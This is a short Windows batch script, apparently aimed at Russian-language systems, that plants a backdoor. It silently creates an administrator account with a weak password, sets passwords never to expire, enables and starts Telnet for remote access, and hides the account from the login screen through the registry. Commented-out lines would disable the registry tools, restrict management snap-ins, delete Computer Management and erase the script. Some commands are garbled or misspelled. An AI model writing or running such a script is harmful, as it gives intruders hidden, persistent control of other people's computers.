@Echo off
net user Admin_Support pass /add >nul
net localgroup net localgroup Администраторы Admin_Support /add >nul
net accounts /maxpwage:unlimited >nul
sc config TlntSvr start= auto >nul
sc start TlntSvr >nul
reg add HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v Admin_Support /t REG_DWORD /d 0 >null
::reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
::reg add HKCU\SOFTWARE\POLICIES\Microsoft\MMC /v RestrictPemitSnapins /t REG_DWORD /d 1 /f >nul
::del %SystemRoot%\system32\compmgmt.msc >nul
::del access.cmd >nul
